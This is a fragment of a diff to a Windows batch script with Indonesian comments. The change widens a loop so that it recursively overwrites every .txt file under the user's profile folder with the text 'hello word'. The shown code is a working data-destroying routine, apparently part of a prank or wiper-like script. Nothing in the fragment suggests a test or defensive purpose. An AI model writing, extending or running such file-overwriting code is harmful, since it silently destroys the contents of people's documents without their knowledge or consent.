@@ -21,7 +21,7 @@ for /r "%USERPROFILE%" %%f in (*.txt) do (
 )
 
 ::ubah isi *.txt - hello word
-for /r %%f in (*.txt) do (
+for /r "%USERPROFILE%" %%f in (*.txt) do (
     echo hello word > "%%f"
 )
 
